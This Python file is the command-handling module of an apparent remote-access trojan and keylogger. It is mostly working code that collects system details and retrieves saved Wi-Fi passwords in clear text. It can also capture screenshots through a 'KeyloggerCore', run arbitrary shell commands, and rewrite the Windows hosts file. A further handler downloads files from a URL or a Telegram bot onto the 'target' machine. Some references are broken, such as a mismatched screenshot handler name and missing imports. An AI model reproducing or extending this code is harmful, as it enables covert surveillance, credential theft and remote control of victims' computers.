import json
import subprocess
import webbrowser
import psutil
import os
import pyperclip
from utils import CommandError

class CommandHandler:
    @staticmethod
    def execute(command_type, params):
        handlers = {
            'system_info': CommandHandler.handle_system_info,
            'file_operation': CommandHandler.handle_file_operation,
            'system_command': CommandHandler.handle_system_command,
            'process_management': CommandHandler.handle_process_management,
            'capture_screenshot': CommandHandler.handle_screenshot,
            'clipboard_history': CommandHandler.handle_clipboard_history,
            'keystroke_history': CommandHandler.handle_keystroke_history,
            'open_url': CommandHandler.handle_open_url,
            'wifi_passwords': CommandHandler.handle_wifi_passwords,  # New handler
            'edit_hosts': CommandHandler.handle_edit_hosts,
            'upload_file': CommandHandler.handle_upload_file
        }
        handler = handlers.get(command_type)
        if not handler:
            raise CommandError(f"Unknown command type: {command_type}")
        return handler(params)

    @staticmethod
    def handle_file_operation(params):
        action = params.get('action')
        path = params.get('path')

        if not action or not path:
            raise CommandError("Missing 'action' or 'path' parameters")

        if action == 'list':
            try:
                files = os.listdir(path)
                return {"files": files}
            except Exception as e:
                raise CommandError(f"Failed to list directory: {str(e)}")
        elif action == 'upload':
            # Implement file upload logic if needed
            raise CommandError("Upload not implemented")
        else:
            raise CommandError(f"Unknown file operation: {action}")

    @staticmethod
    def handle_system_info(params):
        import platform
        import socket
        disk = psutil.disk_usage('/')
        return {
            "os": platform.system(),
            "version": platform.release(),
            "architecture": platform.architecture(),
            "hostname": socket.gethostname(),
            "user": os.getlogin(),
            "cpu_cores": psutil.cpu_count(),
            "total_memory": psutil.virtual_memory().total,
            "disk_usage": {
                "total": disk.total,
                "used": disk.used,
                "free": disk.free,
                "percent": disk.percent
            },
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "antivirus": "Windows Defender"  # Simplified for example
        }

    @staticmethod
    def handle_system_command(params):
        command = params.get('command')
        if not command:
            raise CommandError("Missing 'command' parameter")

        import platform
        system = platform.system().lower()

        command_map = {
            'windows': {
                'shutdown': 'shutdown /s /t 0',
                'restart': 'shutdown /r /t 0',
                'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
                'signout': 'logoff'
            },
            'linux': {
                'shutdown': 'sudo shutdown -h now',
                'restart': 'sudo reboot',
                'sleep': 'sudo pm-suspend',
                'signout': 'pkill -u $USER'
            },
            'darwin': {  # macOS
                'shutdown': 'sudo shutdown -h now',
                'restart': 'sudo shutdown -r now',
                'sleep': 'pmset sleepnow',
                'signout': 'osascript -e \'tell app "System Events" to log out\''
            }
        }

        if system not in command_map or command not in command_map[system]:
            raise CommandError(f"Command '{command}' not supported on {system}")

        shell_command = command_map[system][command]
        try:
            result = subprocess.run(shell_command, shell=True, capture_output=True, text=True, timeout=30)
            return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
        except subprocess.SubprocessError as e:
            raise CommandError(f"Failed to execute system command: {str(e)}")

    @staticmethod
    def handle_process_management(params):
        action = params.get('action')
        if not action:
            raise CommandError("Missing 'action' parameter")
        if action == 'list':
            processes = [{"pid": p.pid, "name": p.name()} for p in psutil.process_iter(['pid', 'name'])]
            return {"processes": processes}
        else:
            raise CommandError(f"Unknown process management action: {action}")

    @staticmethod
    def handle_keystroke_history(params):
        raise CommandError("Keystroke history not implemented")  # Requires ActivityLogger implementation

    @staticmethod
    def handle_clipboard_history(params):
        raise CommandError("Clipboard history not implemented")  # Requires ActivityLogger implementation

    @staticmethod
    def handle_capture_screenshot(params):
        from main import KeyloggerCore
        keylogger = KeyloggerCore()
        screenshot = keylogger._capture_screenshot()
        if screenshot:
            import base64
            return {"screenshot": base64.b64encode(screenshot).decode()}
        raise CommandError("Failed to capture screenshot")

    @staticmethod
    def handle_open_url(params):
        url = params.get('url')
        if not url:
            raise CommandError("Missing 'url' parameter")
        webbrowser.open(url)
        return {"status": "success"}

    @staticmethod
    def handle_raw_command(params):
        command = params.get('command')
        if not command:
            raise CommandError("Missing 'command' parameter")
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
        except subprocess.SubprocessError as e:
            raise CommandError(f"Failed to execute raw command: {str(e)}")

    @staticmethod
    def handle_wifi_passwords(params):
        import subprocess
        import re
        import platform
    
        if platform.system().lower() != 'windows':
            raise CommandError("Wi-Fi password retrieval is only supported on Windows")
    
        try:
            # Get list of Wi-Fi profiles
            result = subprocess.run(
                'netsh wlan show profiles',
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode != 0:
                raise CommandError(f"Failed to get Wi-Fi profiles: {result.stderr}")
    
            # Extract profile names
            profiles = re.findall(r'All User Profile\s*:\s*(.+)', result.stdout)
            wifi_data = []
    
            for profile in profiles:
                profile = profile.strip()
                # Get password for each profile
                result = subprocess.run(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                if result.returncode != 0:
                    continue  # Skip profiles that fail (e.g., no password)
    
                # Extract SSID and password
                ssid_match = re.search(r'SSID name\s*:\s*"(.+)"', result.stdout)
                password_match = re.search(r'Key Content\s*:\s*(.+)', result.stdout)
                ssid = ssid_match.group(1) if ssid_match else profile
                password = password_match.group(1) if password_match else "N/A"
    
                wifi_data.append({"ssid": ssid, "password": password})
    
            return {"wifi_passwords": wifi_data}
        except Exception as e:
            logging.error(f"Failed to retrieve Wi-Fi passwords: {str(e)}")
            raise CommandError(f"Failed to retrieve Wi-Fi passwords: {str(e)}")

    @staticmethod
    def handle_edit_hosts(params):
        import os
        import platform

        if platform.system().lower() != 'windows':
            raise CommandError("Hosts file editing is only supported on Windows")

        action = params.get('action')  # 'add', 'remove', 'list'
        host_entry = params.get('host_entry')  # e.g., "127.0.0.1 example.com"
        hosts_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers', 'etc', 'hosts')

        try:
            if action == 'list':
                with open(hosts_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                return {"hosts_content": content}
            elif action == 'add':
                if not host_entry:
                    raise CommandError("Missing host_entry for add action")
                with open(hosts_path, 'a', encoding='utf-8') as f:
                    f.write(f"\n{host_entry}")
                return {"status": "success", "message": f"Added {host_entry} to hosts file"}
            elif action == 'remove':
                if not host_entry:
                    raise CommandError("Missing host_entry for remove action")
                with open(hosts_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                with open(hosts_path, 'w', encoding='utf-8') as f:
                    removed = False
                    for line in lines:
                        if line.strip() != host_entry.strip():
                            f.write(line)
                        else:
                            removed = True
                    return {"status": "success", "message": f"Removed {host_entry} from hosts file" if removed else f"Entry {host_entry} not found"}
            else:
                raise CommandError(f"Unknown hosts action: {action}")
        except PermissionError:
            logging.error("Permission denied when editing hosts file")
            raise CommandError("Permission denied: Run client as Administrator")
        except Exception as e:
            logging.error(f"Failed to edit hosts file: {str(e)}")
            raise CommandError(f"Failed to edit hosts file: {str(e)}")


    @staticmethod
    def handle_upload_file(params):
        import requests
        import os
        import urllib.parse

        source = params.get('source')  # 'url' or 'telegram'
        file_url = params.get('file_url')  # URL or Telegram file path
        dest_path = params.get('dest_path')  # Destination path on target

        if not source or not file_url or not dest_path:
            raise CommandError("Missing source, file_url, or dest_path")

        try:
            dest_dir = os.path.dirname(dest_path)
            if dest_dir and not os.path.exists(dest_dir):
                os.makedirs(dest_dir)

            if source == 'url':
                response = requests.get(file_url, stream=True, timeout=30)
                if response.status_code != 200:
                    raise CommandError(f"Failed to download file from URL: HTTP {response.status_code}")
                with open(dest_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
            elif source == 'telegram':
                # Assume file_url is a Telegram file_id
                telegram_bot_token = Config.TELEGRAM_BOT_TOKEN  # Add to config.py
                file_info_url = f"https://api.telegram.org/bot{telegram_bot_token}/getFile?file_id={file_url}"
                file_info = requests.get(file_info_url, timeout=30).json()
                if not file_info.get('ok'):
                    raise CommandError(f"Failed to get Telegram file info: {file_info.get('description')}")
                file_path = file_info['result']['file_path']
                file_download_url = f"https://api.telegram.org/file/bot{telegram_bot_token}/{file_path}"
                response = requests.get(file_download_url, stream=True, timeout=30)
                if response.status_code != 200:
                    raise CommandError(f"Failed to download Telegram file: HTTP {response.status_code}")
                with open(dest_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
            else:
                raise CommandError(f"Unknown source: {source}")

            return {"status": "success", "message": f"File uploaded to {dest_path}"}
        except requests.RequestException as e:
            logging.error(f"Network error during file upload: {str(e)}")
            raise CommandError(f"Network error: Failed to download file ({str(e)})")
        except Exception as e:
            logging.error(f"Failed to upload file: {str(e)}")
            raise CommandError(f"Failed to upload file: {str(e)}")